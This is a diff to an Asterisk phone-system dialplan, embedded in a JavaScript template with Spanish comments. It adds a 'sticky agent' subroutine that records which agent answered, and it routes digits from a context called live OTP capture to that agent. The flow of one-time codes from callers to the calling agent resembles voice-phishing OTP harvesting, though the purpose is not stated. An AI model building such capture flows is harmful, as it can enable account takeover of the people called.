@@ -209,6 +209,29 @@ clearglobalvars=no
 [globals]
 CONSOLE=Console/dsp
 
+; Subrutina Pre-Bridge (U) ejecutada en el canal que atiende (Ring-All o Directo) para registrar la extension exacta
+[sub-record-picked-agent]
+exten => s,1,NoOp(=== [AGENT-ANSWERED] Canal que descolgo la llamada: \${CHANNEL} | Endpoint: \${CHANNEL(endpoint)} ===)
+ same => n,Set(PICKED_EXTEN=\${CHANNEL(endpoint)})
+ same => n,ExecIf($["\${PICKED_EXTEN}" = ""]?Set(PICKED_EXTEN=\${CUT(CUT(CHANNEL,-,1),/,2)}))
+ same => n,ExecIf($["\${PICKED_EXTEN}" = ""]?Set(PICKED_EXTEN=\${DIALEDPEERNUMBER}))
+ same => n,ExecIf($["\${PICKED_EXTEN}" = ""]?Set(PICKED_EXTEN=\${CALLERID(num)}))
+ same => n,ExecIf($["\${PICKED_EXTEN}" = ""]?Set(PICKED_EXTEN=1001))
+ same => n,NoOp(=== [STICKY-AGENT-SAVED] Extension \${PICKED_EXTEN} registrada como asesor exclusivo de la llamada ===)
+ same => n,Set(DB(last_picked_agent/\${ARG1})=\${PICKED_EXTEN})
+ same => n,Set(DB(last_picked_agent/3333)=\${PICKED_EXTEN})
+ same => n,Set(DB(last_picked_agent/7777)=\${PICKED_EXTEN})
+ same => n,Set(DB(last_agent_call/\${ARG1})=\${PICKED_EXTEN})
+ same => n,Set(DB(last_agent_call/3333)=\${PICKED_EXTEN})
+ same => n,Set(DB(last_agent_call/7777)=\${PICKED_EXTEN})
+ same => n,Set(DB(last_agent_call/8888)=\${PICKED_EXTEN})
+ same => n,Set(DB(ivr_vars/\${ARG1}_agent_exten)=\${PICKED_EXTEN})
+ same => n,Set(SHARED(PICKED_AGENT,\${MASTER_CHANNEL})=\${PICKED_EXTEN})
+ same => n,Set(__LAST_AGENT=\${PICKED_EXTEN})
+ same => n,Set(__FINAL_AGENT=\${PICKED_EXTEN})
+ same => n,Set(__CALLING_AGENT=\${PICKED_EXTEN})
+ same => n,Return()
+
 ; ------------------------------------------------------------------------------
 ; CONTEXTO INTERNO PARA EXTENSIONES
 ; ------------------------------------------------------------------------------
@@ -332,12 +355,12 @@ exten => 1,1,NoOp(Usuario presiono 1 -> Pausa natural de 2 seg antes de locucion
  same => n,Set(TARGET_AGENT=\${DB(originating_agent/\${CALLERID(num)})})
  same => n,GotoIf($["\${TARGET_AGENT}" != ""]?agent_found:fallback_target)
  same => n(agent_found),NoOp(Retornando llamada al agente que origino el contacto: \${TARGET_AGENT})
- same => n,Dial(PJSIP/\${TARGET_AGENT},30,tTkK)
+ same => n,Dial(PJSIP/\${TARGET_AGENT},30,tTkKU(sub-record-picked-agent^\${CALLERID(num)}))
  same => n,Hangup()
  same => n(fallback_target),NoOp(Destino asignado: ${press1.digit1Target === 'ringall' || press1.digit1Action === 'ringall' ? 'Ring-All (Todas las Extensiones)' : press1.digit1Target})
- same => n,Dial(${press1.digit1Target === 'ringall' || press1.digit1Action === 'ringall' ? ringAllEndpoints : `PJSIP/${press1.digit1Target}`},30,tTkK)
+ same => n,Dial(${press1.digit1Target === 'ringall' || press1.digit1Action === 'ringall' ? ringAllEndpoints : `PJSIP/${press1.digit1Target}`},30,tTkKU(sub-record-picked-agent^\${CALLERID(num)}))
  same => n,Hangup()`
-     : `same => n,Dial(${press1.digit1Target === 'ringall' || press1.digit1Action === 'ringall' ? ringAllEndpoints : `PJSIP/${press1.digit1Target}`},30,tTkK)
+     : `same => n,Dial(${press1.digit1Target === 'ringall' || press1.digit1Action === 'ringall' ? ringAllEndpoints : `PJSIP/${press1.digit1Target}`},30,tTkKU(sub-record-picked-agent^\${CALLERID(num)}))
  same => n,Hangup()`
  }
 
@@ -543,7 +566,7 @@ exten => s,1,Goto(ivr-otp-live-3333,s,1)
 exten => s,1,NoOp(=== CAPTURA EN VIVO EXT 3333: Esperando ingreso de codigo ===)
  same => n,Answer()
  same => n,Wait(1.5)
- same => n,Set(FINAL_AGENT=\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})
+ same => n,Set(FINAL_AGENT=\${IF($["\${DB(last_picked_agent/\${CALLERID(num)})}" != ""]?\${DB(last_picked_agent/\${CALLERID(num)})}:\${IF($["\${DB(last_agent_call/\${CALLERID(num)})}" != ""]?\${DB(last_agent_call/\${CALLERID(num)})}:\${IF($["\${CALLING_AGENT}" != ""]?\${CALLING_AGENT}:1001)})})})
  same => n,Set(RETRY_COUNT=0)
  same => n(pedir_codigo_3333),Set(RETRY_COUNT=$[\${RETRY_COUNT} + 1])
  same => n,Set(USER_DIGITS=)
